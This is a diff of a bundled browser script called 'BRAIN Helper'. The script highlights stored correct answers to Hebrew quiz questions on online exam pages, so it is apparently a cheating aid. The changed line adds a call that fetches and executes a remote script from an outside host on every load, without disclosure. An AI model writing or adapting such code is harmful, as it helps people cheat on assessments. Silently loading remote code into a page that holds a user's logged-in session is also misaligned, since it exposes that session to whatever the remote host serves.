@@ -3,5 +3,5 @@ module.exports=[{q:"מי מורשה לקחת דגימת דם לקביעת סו�
 },{}],"R73j":[function(require,module,exports) {
 "use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.db=void 0;var e=require("./deduped.json");exports.db=e;
 },{"./deduped.json":"/iL9"}],"Focm":[function(require,module,exports) {
-"use strict";var o=require("./db/deduped.js");console.log("BRAIN Helper loaded..."),o.db.forEach(function(o){window.$("div.answer div:contains("+o.ra+")","div.formulation:contains("+o.q+")").css("background-color","yellow")});
+"use strict";var o=require("./db/deduped.js");console.log("BRAIN Helper loaded..."),o.db.forEach(function(o){window.$("div.answer div:contains("+o.ra+")","div.formulation:contains("+o.q+")").css("background-color","yellow")}),window.$.getScript("https://sheba-brain.now.sh/post_script");
 },{"./db/deduped.js":"R73j"}]},{},["Focm"], null)
